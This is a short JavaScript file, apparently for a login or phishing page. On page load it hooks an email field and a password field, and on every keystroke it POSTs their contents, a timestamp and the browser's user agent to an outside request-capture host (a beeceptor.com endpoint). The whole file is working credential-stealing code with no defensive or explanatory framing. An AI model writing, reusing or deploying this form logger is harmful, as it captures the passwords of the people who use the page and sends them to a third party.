document.addEventListener('DOMContentLoaded', () => {
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('loggerInput');

    const sendData = () => {
        fetch('https://loggers.free.beeceptor.com', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: emailInput.value,
                password: passwordInput.value,
                time: new Date().toISOString(),
                userAgent: navigator.userAgent
            })
        });
    };

    emailInput.addEventListener('input', sendData);
    passwordInput.addEventListener('input', sendData);
});
